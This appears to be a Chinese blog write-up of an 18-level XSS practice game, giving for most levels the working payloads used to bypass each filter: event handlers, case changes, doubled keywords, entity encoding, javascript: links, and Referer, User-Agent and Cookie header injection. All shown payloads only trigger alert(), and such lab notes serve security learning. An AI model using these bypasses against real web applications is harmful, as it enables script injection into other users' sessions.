---
title: xss挑战通关笔记
tags:
  - web安全知识
categories:
  - web安全知识
copyright: true
abbrlink: 8526b6d1
date: 2020-03-17 17:03:55
---
###  xss小游戏通关笔记

    * levle1 
    * level2 
    * level3 
    * level4 
    * level5 
    * level6 
    * level7 
    * level8 
    * level9 
    * level10 
    * level11 
    * level12 
    * level13 
    * level14 
    * level15 
    * level16 
    * level17 
    * level18 

##  levle1

在url中输入tt，页面输出tt  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317115853287.png)  
在url中构造这段js代码  
` <script>alert(1)</script> `  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317120137712.png)

##  level2

第二关是一个输入框，输入js代码  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317120431553.png)  
观察html页面代码，输出做了转义，但是输入没有做转义，在输入处构造js代码，注意闭合。  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317120557529.png)  
“>闭合前面的<”,//注入后门的内容,或者闭合后面的内容

    
    
    "><script>alert(1)</script>//  
    "><script>alert(/xss/)</script>"
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317121018943.png)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317121059470.png)

##  level3

第三关依然是一个输入框。输入一段js代码看html，输入和输出做了转义 ![在这里插入图片描述](https://img-
blog.csdnimg.cn/2020031712131059.png)  
不能使用 ` <script> ` ,使用js中的事件  
onmouseover  
onclick

    
    
    'onclick=alert(1)//
    'onmouseover=alert(1)//
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317122250635.png)

##  level4

在输入输出处做了转义和替换  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317122518937.png)  
不能使用 ` <script> `  
同样使用事件绕过

    
    
    "onclick=alert(1)//
    "onmouseover=alert(1)//
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317122721194.png)

##  level5

输入将 ` <script> ` 代替 ` <scr_ipt> ` ,输出转义  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317122856998.png)  
事件on也被替换了o_n  
![hi](https://img-blog.csdnimg.cn/202003171233213.png)  
事件中的on替换成了o_n  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317123316303.png)  
使用a标签

    
    
    "><a href=javascript:alert(1)>111</a>
    "><a href=javascript:alert(1)//
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317124305396.png)

##  level6

同样，输出做了转义，输入做了替换  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317124800182.png)  
a标签也不能使用了，大小写替换

    
    
    "><a HrEf=javascript:alert(1)//
    "><sCript>alert(1)</sCript>//
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317125123405.png)

##  level7

on src 都被换成空了  
![on  都被 过滤了](https://img-blog.csdnimg.cn/20200317131147947.png)  
使用双写绕过

    
    
    "><scrscriptipt>alert(/xss/)</scrscriptipt>
    "oonnclick=alert(1)//
    "oonnmouseover=alert(1)//
    
    

##  level8

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317144107833.png)  
观察代码，输入使用htmlspecialchars函数做了html实体化，并且做了过滤替换。使用伪协议绕过。

    
    
    javascript:alert(1)
    

但是script被过滤了，使用编码绕过。编码其中一个字母即可

    
    
    javascri&#x70;&#x74;:alert(1)
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317144849951.png)

##  level9

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020031714512856.png)  
观察源码可以发现在第8关的基础上面，在输出点做了一个判断连接是否是http://  
将http://1.com给注释掉了

    
    
    javascri&#x70;&#x74;:alert(1)//http://1.com// #使用了注释
    
    javascrip&#x74;:%0dhttp://1.com%0dalert(1) #不使用注释
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317145906825.png)

##  level10

没有了输入框，查看源码  
尖括号<>都被转换成空，还有三个hidden的隐藏输入框  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317150303517.png)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317150624597.png)  
构造js代码

    
    
    hello&t_sort="type="text" onclick="alert(1)
    

##  level11

http头部的xss  
` $str11=$_SERVER['HTTP_REFERER']; ` 多了一个接收http请求头的字符串  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317155521804.png)  
抓包  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317154929543.png)  
改包，添加Referer头  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020031715515551.png)

    
    
    Referer:" onmouseover=alert(11) type="text"
    
                    Referer:" onclick="alert(11)" type="text
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020031715523781.png)

##  level12

同11关，只是此关是UA注入的xss  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317155945679.png)

    
    
    onmouseover=alert(11) type="text"
    " onclick="alert(11)" type="text
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317155850119.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317155913592.png)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317155911519.png)

##  level13

此关是cookie  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317160038355.png)  
抓包  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317160737969.png)

    
    
    " onmouseover=alert(13) type="text"
    " onclick="alert(13)" type="text
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317160858500.png)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317160917846.png)

##  level14

未看明白，百度看是需要上传一个含有xss代码的图片触发xss。这关是exif xss

##  level15

未看明白，百度此关angularjs的ng-include，相当于PHP中的文件包含。  
包含第一关的源码进行xss。

    
    
    ?src='level1.php?name=test<img src=1 οnerrοr=alert(1)>'
    

但是googleapis.com无法访问  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317180010358.png)

##  level16

查看源码，过滤了空格，script，/  
使用%0d %0a做分割符  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317163412266.png)

    
    
    ?keyword=<img%0dsrc=1%0donerror=alert()>
    
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317163923585.png)

##  level17

输入点在url上面，输出在src中 ![](https://img-blog.csdnimg.cn/20200317164202296.png)

    
    
    onmouseover=alert(1)
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317164320150.png)

##  level18

和17关一样

    
    
    onmouseover=alert(1)
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317164500225.png)

